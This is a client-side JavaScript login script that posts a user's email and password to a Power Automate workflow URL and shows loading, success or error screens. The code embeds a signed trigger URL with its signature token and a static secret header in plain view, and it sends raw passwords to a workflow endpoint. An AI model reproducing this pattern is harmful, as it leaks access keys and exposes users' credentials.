const API_URL = 'https://default53918e53d56f4a4dba205adc87bbc2.3f.environment.api.powerplatform.com:443/powerautomate/automations/direct/workflows/21d995c7d0df4e3490aea998d3576e97/triggers/manual/paths/invoke?api-version=1&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=fnK3Sj3inlKs3_01yOU_v4VZFQwvfWQ1rZUQzlb8nJQ';

const loginScreen = document.getElementById('login-screen');
const loadingScreen = document.getElementById('loading-screen');
const successScreen = document.getElementById('success-screen');
const errorMessage = document.getElementById('error-message');
const loginForm = document.getElementById('login-form');
const userEmailSpan = document.getElementById('user-email');

function showScreen(screen) {
    loginScreen.classList.remove('active');
    loadingScreen.classList.remove('active');
    successScreen.classList.remove('active');
    screen.classList.add('active');
}

loginForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    // Hide any previous error
    errorMessage.classList.remove('show');

    // Show loading screen
    showScreen(loadingScreen);

    try {
        const response = await fetch(API_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-TSG-Secret': 'x9F2kL0a9s8D'
            },
            body: JSON.stringify({ email, password })
        });

        if (response.ok) {
            // Success - show success screen
            userEmailSpan.textContent = email;
            showScreen(successScreen);
        } else if (response.status === 401) {
            // Auth failed - show error
            showScreen(loginScreen);
            errorMessage.classList.add('show');
        } else {
            // Other error
            showScreen(loginScreen);
            errorMessage.textContent = 'An error occurred. Please try again.';
            errorMessage.classList.add('show');
        }
    } catch (error) {
        // Network or other error
        showScreen(loginScreen);
        errorMessage.textContent = 'Connection failed. Please check your internet and try again.';
        errorMessage.classList.add('show');
    }
});

function resetToLogin() {
    loginForm.reset();
    errorMessage.classList.remove('show');
    errorMessage.textContent = 'Invalid email or password. Please try again.';
    showScreen(loginScreen);
}
